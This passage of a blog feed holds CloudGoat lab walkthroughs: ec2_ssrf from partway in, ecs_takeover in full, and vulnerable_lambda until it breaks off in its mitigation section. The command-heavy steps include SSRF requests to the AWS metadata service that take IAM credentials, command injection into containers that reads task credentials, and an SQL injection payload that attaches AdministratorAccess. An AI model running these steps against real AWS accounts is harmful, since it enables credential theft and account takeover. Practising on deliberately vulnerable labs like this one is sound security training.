class="code"><pre><span class="line">cloudgoat create ec2_ssrf</span><br></pre></td></tr></table></figure><p>The deployment will provide initial AWS credentials:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cloudgoat_output_solus_access_key_id = AKIA[REDACTED]</span><br><span class="line">cloudgoat_output_solus_secret_key = [REDACTED]</span><br></pre></td></tr></table></figure><h2 id="Step-2-Initial-Enumeration-with-CloudTap"><a href="#Step-2-Initial-Enumeration-with-CloudTap" class="headerlink" title="Step 2: Initial Enumeration with CloudTap"></a>Step 2: Initial Enumeration with CloudTap</h2><p>Configure the initial AWS profile:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws configure --profile initial</span><br></pre></td></tr></table></figure><p>Launch CloudTap for comprehensive enumeration:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 CloudTap.py --keys initial</span><br></pre></td></tr></table></figure><p>CloudTap’s automated scanning reveals interesting findings, including a Lambda function containing sensitive environment variables.</p><p><img src="/images/EC2_SSRF/function_with_creds.png" alt="Lambda function with credentials discovered"></p><h2 id="Step-3-Escalating-with-Lambda-Credentials"><a href="#Step-3-Escalating-with-Lambda-Credentials" class="headerlink" title="Step 3: Escalating with Lambda Credentials"></a>Step 3: Escalating with Lambda Credentials</h2><p>Configure a new profile with the discovered Lambda credentials:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws configure --profile lambda-creds</span><br></pre></td></tr></table></figure><p>Execute another CloudTap scan to map the expanded attack surface:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 CloudTap.py --keys lambda-creds</span><br></pre></td></tr></table></figure><p>This reveals detailed information about a running EC2 instance, including its public IP and accessible services.</p><p><img src="/images/EC2_SSRF/ec2_info.png" alt="EC2 instance information discovered"></p><h2 id="Step-4-Identifying-the-SSRF-Vulnerability"><a href="#Step-4-Identifying-the-SSRF-Vulnerability" class="headerlink" title="Step 4: Identifying the SSRF Vulnerability"></a>Step 4: Identifying the SSRF Vulnerability</h2><p>Accessing the EC2 instance’s web service on port 80 reveals a vulnerable application with hints about SSRF exploitation possibilities.</p><p><img src="/images/EC2_SSRF/web_page.png" alt="Web application interface"></p><p>Through parameter testing, we identify the vulnerable <code>url</code> parameter that accepts external URLs.</p><p><img src="/images/EC2_SSRF/post_parameter.png" alt="SSRF parameter identification"></p><h2 id="Step-5-Exploiting-SSRF-for-Metadata-Access"><a href="#Step-5-Exploiting-SSRF-for-Metadata-Access" class="headerlink" title="Step 5: Exploiting SSRF for Metadata Access"></a>Step 5: Exploiting SSRF for Metadata Access</h2><p>The classic SSRF payload targets the AWS metadata service at <code>169.254.169.254</code>. We craft a request to extract IAM role credentials:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl &quot;http://[EC2-IP]/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/cg-ec2-role-[ROLE-ID]&quot;</span><br></pre></td></tr></table></figure><p>This returns temporary AWS credentials including the session token.</p><p><img src="/images/EC2_SSRF/curl_creds.png" alt="Successful credential extraction via SSRF"></p><h2 id="Step-6-Leveraging-Temporary-Credentials"><a href="#Step-6-Leveraging-Temporary-Credentials" class="headerlink" title="Step 6: Leveraging Temporary Credentials"></a>Step 6: Leveraging Temporary Credentials</h2><p>Configure a new profile with the extracted credentials:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">aws configure --profile metadata-creds</span><br><span class="line">aws configure set aws_session_token &quot;[SESSION-TOKEN]&quot; --profile metadata-creds</span><br></pre></td></tr></table></figure><p>Execute CloudTap with the new credentials:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 CloudTap.py --keys metadata-creds</span><br></pre></td></tr></table></figure><p>CloudTap automatically discovers and downloads contents from an S3 bucket containing additional AWS credentials.</p><p><img src="/images/EC2_SSRF/aws_bucket_found.png" alt="S3 bucket discovery and download"></p><h2 id="Step-7-Final-Privilege-Escalation"><a href="#Step-7-Final-Privilege-Escalation" class="headerlink" title="Step 7: Final Privilege Escalation"></a>Step 7: Final Privilege Escalation</h2><p>The S3 bucket contains a configuration file with long-term AWS credentials:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[default]</span><br><span class="line">aws_access_key_id = AKIA[REDACTED]</span><br><span class="line">aws_secret_access_key = [REDRACTED]</span><br><span class="line">region = us-east-1</span><br></pre></td></tr></table></figure><p>Configure the final profile:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws configure --profile final-creds</span><br></pre></td></tr></table></figure><h2 id="Step-8-Capturing-the-Flag"><a href="#Step-8-Capturing-the-Flag" class="headerlink" title="Step 8: Capturing the Flag"></a>Step 8: Capturing the Flag</h2><p>With the highest privilege credentials, invoke the original Lambda function to retrieve the challenge flag:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws lambda invoke --function-name cg-lambda-[FUNCTION-ID] ./flag.txt --profile final-creds</span><br></pre></td></tr></table></figure><p><img src="/images/EC2_SSRF/final_thing.png" alt="Challenge completion and flag retrieval"></p><h2 id="Key-Takeaways"><a href="#Key-Takeaways" class="headerlink" title="Key Takeaways"></a>Key Takeaways</h2><p>This CloudGoat ec2_ssrf walkthrough demonstrates several critical AWS security concepts:</p><ol><li>SSRF Impact: Server-Side Request Forgery can lead to complete AWS account compromise</li><li>Metadata Service Risks: Unrestricted access to <code>169.254.169.254</code> enables credential theft</li><li>Credential Chain Attacks: Multiple credential sources can be chained for escalation</li><li>Automated Enumeration: Tools like <a href="https://github.com/PanosoikoGr/CloudTap">CloudTap</a> significantly accelerate cloud penetration testing</li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> AWS </tag>
            
            <tag> CloudGoat </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CloudGoat-ECS_Takeover</title>
      <link href="/2025/06/03/CloudGoat-ECS-Takeover/"/>
      <url>/2025/06/03/CloudGoat-ECS-Takeover/</url>
      
        <content type="html"><![CDATA[<h1 id="CloudGoat-ECS-Takeover-Scenario-Complete-Walkthrough-and-Exploitation-Guide"><a href="#CloudGoat-ECS-Takeover-Scenario-Complete-Walkthrough-and-Exploitation-Guide" class="headerlink" title="CloudGoat ECS Takeover Scenario: Complete Walkthrough and Exploitation Guide"></a>CloudGoat ECS Takeover Scenario: Complete Walkthrough and Exploitation Guide</h1><p>This comprehensive walkthrough demonstrates how to exploit the ecs_takeover scenario in CloudGoat, Amazon’s vulnerable-by-design AWS deployment tool. We’ll explore container escape techniques, AWS metadata service exploitation, and ECS privilege escalation using our custom enumeration tool CloudTap.</p><h2 id="Prerequisites-and-Setup"><a href="#Prerequisites-and-Setup" class="headerlink" title="Prerequisites and Setup"></a>Prerequisites and Setup</h2><h3 id="Initial-Environment-Configuration"><a href="#Initial-Environment-Configuration" class="headerlink" title="Initial Environment Configuration"></a>Initial Environment Configuration</h3><p>Begin by configuring CloudGoat to whitelist your IP address for access:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cloudgoat config whitelist --auto</span><br></pre></td></tr></table></figure><p>Deploy the vulnerable ECS environment:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cloudgoat create ecs_takeover</span><br></pre></td></tr></table></figure><p>Upon successful deployment, you’ll receive initial reconnaissance information:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[cloudgoat] terraform output completed with no error code.</span><br><span class="line">Start-Note = If a 503 error is returned by the ALB give a few mins for the website container to become active.</span><br><span class="line">vuln-site = ec2-34-230-6-114.compute-1.amazonaws.com</span><br></pre></td></tr></table></figure><h2 id="Phase-1-Initial-Reconnaissance"><a href="#Phase-1-Initial-Reconnaissance" class="headerlink" title="Phase 1: Initial Reconnaissance"></a>Phase 1: Initial Reconnaissance</h2><h3 id="Web-Application-Analysis"><a href="#Web-Application-Analysis" class="headerlink" title="Web Application Analysis"></a>Web Application Analysis</h3><p>The target application presents a minimal interface with limited functionality:</p><p><img src="/images/ECS_Takeover/website.png" alt="Image: Web Application Interface"></p><h3 id="AWS-Metadata-Service-Exploitation"><a href="#AWS-Metadata-Service-Exploitation" class="headerlink" title="AWS Metadata Service Exploitation"></a>AWS Metadata Service Exploitation</h3><p>The first attack vector involves exploiting Server-Side Request Forgery (SSRF) to access the AWS Instance Metadata Service (IMDS):</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl &quot;http://ec2-34-230-6-114.compute-1.amazonaws.com/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/&quot;</span><br></pre></td></tr></table></figure><p>This request reveals available IAM roles:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;p&gt;http://169.254.169.254/latest/meta-data/iam/security-credentials/&lt;/p&gt;</span><br><span class="line">&lt;p&gt;cg-ecs-takeover-cgidnrc0gpu6ke-ecs-agent&lt;/p&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure><h3 id="Credential-Extraction"><a href="#Credential-Extraction" class="headerlink" title="Credential Extraction"></a>Credential Extraction</h3><p>Extract the full credentials for the identified role:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl &quot;http://ec2-34-230-6-114.compute-1.amazonaws.com/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/cg-ecs-takeover-cgidnrc0gpu6ke-ecs-agent&quot;</span><br></pre></td></tr></table></figure><p><img src="/images/ECS_Takeover/creds_dumped.png" alt="Image: Initial Credentials Dump"></p><h2 id="Phase-2-Privilege-Enumeration-with-CloudTap"><a href="#Phase-2-Privilege-Enumeration-with-CloudTap" class="headerlink" title="Phase 2: Privilege Enumeration with CloudTap"></a>Phase 2: Privilege Enumeration with CloudTap</h2><h3 id="CloudTap-Configuration"><a href="#CloudTap-Configuration" class="headerlink" title="CloudTap Configuration"></a>CloudTap Configuration</h3><p>Configure AWS CLI with the extracted credentials:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">aws configure --profile init</span><br><span class="line">aws configure set aws_session_token &quot;&quot; --profile init</span><br></pre></td></tr></table></figure><h3 id="Initial-Enumeration"><a href="#Initial-Enumeration" class="headerlink" title="Initial Enumeration"></a>Initial Enumeration</h3><p>Use <a href="https://github.com/PanosoikoGr/CloudTap">CloudTap</a> for comprehensive AWS privilege enumeration:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 CloudTap.py --keys init</span><br></pre></td></tr></table></figure><p>The initial scan yields minimal results, indicating limited permissions with the current credentials.</p><h2 id="Phase-3-Container-Escape-and-Privilege-Escalation"><a href="#Phase-3-Container-Escape-and-Privilege-Escalation" class="headerlink" title="Phase 3: Container Escape and Privilege Escalation"></a>Phase 3: Container Escape and Privilege Escalation</h2><h3 id="Command-Injection-Discovery"><a href="#Command-Injection-Discovery" class="headerlink" title="Command Injection Discovery"></a>Command Injection Discovery</h3><p>Exploit command injection vulnerability in the web application:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">; docker ps</span><br></pre></td></tr></table></figure><p>The semicolon (<code>;</code>) terminates the current command, allowing execution of arbitrary Docker commands.</p><h3 id="Container-Discovery"><a href="#Container-Discovery" class="headerlink" title="Container Discovery"></a>Container Discovery</h3><p>Identify running containers, specifically targeting privileged containers:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">; docker ps | grep privd</span><br></pre></td></tr></table></figure><p>This reveals the privileged container:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ecs-cg-ecs-takeover-cgidnrc0gpu6ke-privd-1-privd-e0f596c1e89bcbb02900</span><br></pre></td></tr></table></figure><h3 id="ECS-Metadata-Exploitation"><a href="#ECS-Metadata-Exploitation" class="headerlink" title="ECS Metadata Exploitation"></a>ECS Metadata Exploitation</h3><p>Extract container credentials using the ECS metadata endpoint:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">; docker exec [privd_Id] sh -c &#x27;wget -O- 169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI&#x27;</span><br></pre></td></tr></table></figure><h2 id="Phase-4-Advanced-ECS-Enumeration"><a href="#Phase-4-Advanced-ECS-Enumeration" class="headerlink" title="Phase 4: Advanced ECS Enumeration"></a>Phase 4: Advanced ECS Enumeration</h2><h3 id="Enhanced-CloudTap-Analysis"><a href="#Enhanced-CloudTap-Analysis" class="headerlink" title="Enhanced CloudTap Analysis"></a>Enhanced CloudTap Analysis</h3><p>Configure a new AWS profile with the privileged container credentials and re-run CloudTap:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 CloudTap.py --keys init</span><br></pre></td></tr></table></figure><p><img src="/images/ECS_Takeover/ecs_findings.png" alt="Image: ECS Enumeration Results"></p><p>CloudTap discovers:</p><ul><li>4 running ECS tasks</li><li>2 registered container instances</li><li>3 active services</li><li>High-value “vault” task requiring investigation</li></ul><h3 id="Task-Analysis"><a href="#Task-Analysis" class="headerlink" title="Task Analysis"></a>Task Analysis</h3><p>Examine the vault task configuration:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws --profile [privd_profile] ecs describe-tasks --cluster [cluster_name] --tasks [vault_task] | jq</span><br></pre></td></tr></table></figure><h2 id="Phase-5-Container-Instance-Manipulation"><a href="#Phase-5-Container-Instance-Manipulation" class="headerlink" title="Phase 5: Container Instance Manipulation"></a>Phase 5: Container Instance Manipulation</h2><h3 id="Credential-Switching"><a href="#Credential-Switching" class="headerlink" title="Credential Switching"></a>Credential Switching</h3><p>Return to the web application to extract EC2 instance metadata credentials:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://169.254.169.254/latest/meta-data/iam/security-credentials/cg-ecs-takeover-cgidnrc0gpu6ke-ecs-agent</span><br></pre></td></tr></table></figure><h3 id="Instance-Draining"><a href="#Instance-Draining" class="headerlink" title="Instance Draining"></a>Instance Draining</h3><p>Force redeployment of the vault container to the compromised instance:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws --profile [host_profile] ecs update-container-instances-state --cluster [cluster_name] --container-instances [vault_instance] --status DRAINING</span><br></pre></td></tr></table></figure><h2 id="Phase-6-Final-Exploitation"><a href="#Phase-6-Final-Exploitation" class="headerlink" title="Phase 6: Final Exploitation"></a>Phase 6: Final Exploitation</h2><h3 id="Container-Redeployment-Verification"><a href="#Container-Redeployment-Verification" class="headerlink" title="Container Redeployment Verification"></a>Container Redeployment Verification</h3><p>Monitor container redeployment:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">; docker ps | grep vault</span><br></pre></td></tr></table></figure><p><img src="/images/ECS_Takeover/vault_id.png" alt="Image: Vault Container ID"></p><h3 id="File-System-Exploration"><a href="#File-System-Exploration" class="headerlink" title="File System Exploration"></a>File System Exploration</h3><p>List contents of the vault container:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">; docker exec ecs-cg-ecs-takeover-cgidnrc0gpu6ke-vault-1-vault-b2c3cbf9fc82d7b3eb01 ls</span><br></pre></td></tr></table></figure><h3 id="Flag-Extraction"><a href="#Flag-Extraction" class="headerlink" title="Flag Extraction"></a>Flag Extraction</h3><p>Retrieve the final objective:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">; docker exec ecs-cg-ecs-takeover-cgidnrc0gpu6ke-vault-1-vault-b2c3cbf9fc82d7b3eb01 cat FLAG.TXT</span><br></pre></td></tr></table></figure><p><img src="/images/ECS_Takeover/cat_flag.png" alt="Image: Flag Extraction"></p><h2 id="Key-Takeaways"><a href="#Key-Takeaways" class="headerlink" title="Key Takeaways"></a>Key Takeaways</h2><p>This CloudGoat ecs_takeover scenario demonstrates several critical AWS security concepts:</p><ol><li>SSRF to IMDS exploitation - Leveraging application vulnerabilities to access cloud metadata</li><li>Container privilege escalation - Moving from limited to privileged container contexts</li><li>ECS task manipulation - Using legitimate AWS APIs for malicious purposes</li><li>Cross-service privilege escalation - Combining multiple AWS service permissions for maximum impact</li></ol><h2 id="Tools-and-Resources"><a href="#Tools-and-Resources" class="headerlink" title="Tools and Resources"></a>Tools and Resources</h2><ul><li>CloudTap: Advanced AWS enumeration tool - <a href="hhttps://github.com/PanosoikoGr/CloudTap">GitHub Repository</a></li><li>CloudGoat: AWS vulnerable infrastructure for learning</li><li>AWS CLI: Essential for cloud penetration testing</li></ul><p>This walkthrough demonstrates the importance of proper AWS security configurations, container isolation, and the powerful capabilities of specialized enumeration tools like CloudTap in identifying complex attack paths within cloud environments.</p>]]></content>
      
      
      
        <tags>
            
            <tag> AWS </tag>
            
            <tag> CloudGoat </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CloudGoat-Vulnerable_Lambda</title>
      <link href="/2025/06/02/CloudGoat-Vulnerable-Lambda/"/>
      <url>/2025/06/02/CloudGoat-Vulnerable-Lambda/</url>
      
        <content type="html"><![CDATA[<h1 id="CloudGoat-Vulnerable-Lambda-Walkthrough"><a href="#CloudGoat-Vulnerable-Lambda-Walkthrough" class="headerlink" title="CloudGoat Vulnerable Lambda Walkthrough"></a>CloudGoat Vulnerable Lambda Walkthrough</h1><p>This walkthrough demonstrates how to exploit the CloudGoat vulnerable_lambda scenario using <a href="https://github.com/PanosoikoGr/CloudTap">CloudTap</a> for AWS enumeration and privilege escalation. The scenario involves exploiting an SQL injection vulnerability in a Lambda function to gain Administrator access. This CloudGoat walkthrough showcases common AWS security misconfigurations and demonstrates how tools like <a href="https://github.com/PanosoikoGr/CloudTap">CloudTap</a> can streamline the AWS penetration testing process.<br>CloudTap is a powerful AWS enumeration tool that automates credential testing, permission discovery, and role assumption, making it invaluable for AWS security assessments and CloudGoat scenarios.</p><h2 id="Initial-Setup"><a href="#Initial-Setup" class="headerlink" title="Initial Setup"></a>Initial Setup</h2><p>First, we need to whitelist our IP address and create the vulnerable Lambda environment:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cloudgoat config whitelist --auto</span><br><span class="line">cloudgoat create vulnerable_lambda</span><br></pre></td></tr></table></figure><p>The command returns initial credentials:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[cloudgoat] terraform output completed with no error code.</span><br><span class="line">cloudgoat_output_aws_account_id = [REDACTED]</span><br><span class="line">cloudgoat_output_bilbo_access_key_id = [REDACTED]</span><br><span class="line">cloudgoat_output_bilbo_secret_key = [REDACTED]</span><br></pre></td></tr></table></figure><h2 id="Enumeration-with-CloudTap"><a href="#Enumeration-with-CloudTap" class="headerlink" title="Enumeration with CloudTap"></a>Enumeration with CloudTap</h2><p>Configure AWS credentials and use <a href="https://github.com/PanosoikoGr/CloudTap">CloudTap</a> to enumerate permissions:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">aws configure --profile init</span><br><span class="line">python3 CloudTap.py --keys init</span><br></pre></td></tr></table></figure><h3 id="Initial-Findings"><a href="#Initial-Findings" class="headerlink" title="Initial Findings"></a>Initial Findings</h3><p>CloudTap reveals several key findings:</p><ol><li><p>Inline Policy Discovery: The user has an inline policy allowing role assumption for <code>lambda-invoker</code><br>  <img src="/images/Vulnerable_Lambda/inline_policy.png" alt="Policy"></p></li><li><p>Assumed Role Policy: The <code>lambda-invoker</code> role has specific permissions for Lambda function operations<br>  <img src="/images/Vulnerable_Lambda/assumed_role_policy.png" alt="Assumed_roles"></p></li><li><p>Policy Applier Role: Another role exists that can attach user policies to the <code>bilbo</code> user<br>  <img src="/images/Vulnerable_Lambda/policy_applier.png" alt="Policy Applier"></p></li></ol><p>The <code>policy_applier</code> role has the following key permission:</p><ul><li>Effect: <code>Allow</code></li><li>Action: <code>iam:AttachUserPolicy</code></li><li>Resource: Specific to the <code>cg-bilbo-cgidsyjs1yck26</code> user</li></ul><h2 id="Lambda-Function-Analysis"><a href="#Lambda-Function-Analysis" class="headerlink" title="Lambda Function Analysis"></a>Lambda Function Analysis</h2><p>Set up the secondary credentials (remember to include the <code>aws_session_token</code>) and run CloudTap again:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 CloudTap.py --keys sec</span><br></pre></td></tr></table></figure><p><img src="/images/Vulnerable_Lambda/function_found.png" alt="Found Function"></p><p>CloudTap automatically downloads any Lambda functions it discovers. The main function code reveals:</p><h3 id="Lambda-Function-Code-Analysis"><a href="#Lambda-Function-Code-Analysis" class="headerlink" title="Lambda Function Code Analysis"></a>Lambda Function Code Analysis</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> boto3</span><br><span class="line"><span class="keyword">from</span> sqlite_utils <span class="keyword">import</span> Database</span><br><span class="line"></span><br><span class="line">db = Database(<span class="string">&quot;my_database.db&quot;</span>)</span><br><span class="line">iam_client = boto3.client(<span class="string">&#x27;iam&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">handler</span>(<span class="params">event, context</span>):</span><br><span class="line">    target_policys = event[<span class="string">&#x27;policy_names&#x27;</span>]</span><br><span class="line">    user_name = event[<span class="string">&#x27;user_name&#x27;</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;target policys are : <span class="subst">&#123;target_policys&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> policy <span class="keyword">in</span> target_policys:</span><br><span class="line">        statement_returns_valid_policy = <span class="literal">False</span></span><br><span class="line">        statement = <span class="string">f&quot;select policy_name from policies where policy_name=&#x27;<span class="subst">&#123;policy&#125;</span>&#x27; and public=&#x27;True&#x27;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> row <span class="keyword">in</span> db.query(statement):</span><br><span class="line">            statement_returns_valid_policy = <span class="literal">True</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;applying <span class="subst">&#123;row[<span class="string">&#x27;policy_name&#x27;</span>]&#125;</span> to <span class="subst">&#123;user_name&#125;</span>&quot;</span>)</span><br><span class="line">            response = iam_client.attach_user_policy(</span><br><span class="line">                UserName=user_name,</span><br><span class="line">                PolicyArn=<span class="string">f&quot;arn:aws:iam::aws:policy/<span class="subst">&#123;row[<span class="string">&#x27;policy_name&#x27;</span>]&#125;</span>&quot;</span></span><br><span class="line">            )</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;result: &quot;</span> + <span class="built_in">str</span>(response[<span class="string">&#x27;ResponseMetadata&#x27;</span>][<span class="string">&#x27;HTTPStatusCode&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> statement_returns_valid_policy:</span><br><span class="line">            invalid_policy_statement = <span class="string">f&quot;<span class="subst">&#123;policy&#125;</span> is not an approved policy, please only choose from approved &quot;</span> \</span><br><span class="line">                                       <span class="string">f&quot;policies and don&#x27;t cheat. :) &quot;</span></span><br><span class="line">            <span class="built_in">print</span>(invalid_policy_statement)</span><br><span class="line">            <span class="keyword">return</span> invalid_policy_statement</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;All managed policies were applied as expected.&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="Database-Analysis"><a href="#Database-Analysis" class="headerlink" title="Database Analysis"></a>Database Analysis</h3><p>The SQLite database contains policy information:<br><img src="/images/Vulnerable_Lambda/database_file.png" alt="Database"></p><p>Notice that <code>AdministratorAccess</code> is set to <code>False</code> in the <code>public</code> column, preventing legitimate access to this high-privilege policy.</p><h2 id="SQL-Injection-Exploitation"><a href="#SQL-Injection-Exploitation" class="headerlink" title="SQL Injection Exploitation"></a>SQL Injection Exploitation</h2><h3 id="Vulnerability-Analysis"><a href="#Vulnerability-Analysis" class="headerlink" title="Vulnerability Analysis"></a>Vulnerability Analysis</h3><p>The Lambda function contains a critical SQL injection vulnerability in this line:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">statement = f&quot;select policy_name from policies where policy_name=&#x27;&#123;policy&#125;&#x27; and public=&#x27;True&#x27;&quot;</span><br></pre></td></tr></table></figure><p>This unparameterized query can be exploited to bypass the <code>public=&#39;True&#39;</code> condition.</p><h3 id="Exploit-Execution"><a href="#Exploit-Execution" class="headerlink" title="Exploit Execution"></a>Exploit Execution</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws lambda invoke   --function-name cgidsyjs1yck26-policy_applier_lambda1   --cli-binary-format raw-in-base64-out   --payload &#x27;&#123;&quot;policy_names&quot;: [&quot;&#x27;\&#x27;&#x27; OR policy_name=&#x27;\&#x27;&#x27;AdministratorAccess&#x27;\&#x27;&#x27; -- &quot;], &quot;user_name&quot;: &quot;cg-bilbo-cgidsyjs1yck26&quot;&#125;&#x27;   --region us-east-1   --profile sec output.json</span><br></pre></td></tr></table></figure><h3 id="Injection-Explanation"><a href="#Injection-Explanation" class="headerlink" title="Injection Explanation"></a>Injection Explanation</h3><p>The malicious payload transforms the SQL query to:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select policy_name from policies where policy_name=&#x27;&#x27; OR policy_name=&#x27;AdministratorAccess&#x27; -- &#x27; and public=&#x27;True&#x27;</span><br></pre></td></tr></table></figure><ul><li>The <code>--</code> operator comments out the rest of the query</li><li>The condition becomes: <code>policy_name = &#39;&#39; OR policy_name = &#39;AdministratorAccess&#39;</code></li><li>This bypasses the <code>public=&#39;True&#39;</code> restriction</li></ul><h2 id="Privilege-Escalation-Success"><a href="#Privilege-Escalation-Success" class="headerlink" title="Privilege Escalation Success"></a>Privilege Escalation Success</h2><p>Running CloudTap again reveals the successful privilege escalation:<br><img src="/images/Vulnerable_Lambda/admin_access.png" alt="Admin"><br>The <code>AdministratorAccess</code> policy is now attached to the initial user!</p><h2 id="Flag-Retrieval"><a href="#Flag-Retrieval" class="headerlink" title="Flag Retrieval"></a>Flag Retrieval</h2><p>With Administrator access, we can retrieve the final flag from AWS Secrets Manager:<br><img src="/images/Vulnerable_Lambda/final_flag.png" alt="Flag"></p><h2 id="SQL-Injection-Mitigation"><a href="#SQL-Injection-Mitigation" class="headerlink" title="SQL Injection Mitigation"></a>SQL Injection Mitigation</h2><h3 id="Recommended-Fixes"><a href="#Recommended-Fixes" class="headerlink" title="Recommended Fixes"></a>Recommended Fixes</h3><ol><li>Use Parameterized Queries: Replace string concatenation with parameterized queries</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># Vulnerable code</span><br><span class="line">statement = f&quot;select policy_name from policies where policy_name=&#x27;&#123;policy&#125;&#x27; and public=&#x27;True&#x27;&quot;</span><br><span class="line"></span><br><span class="line"># Secure code</span><br><span 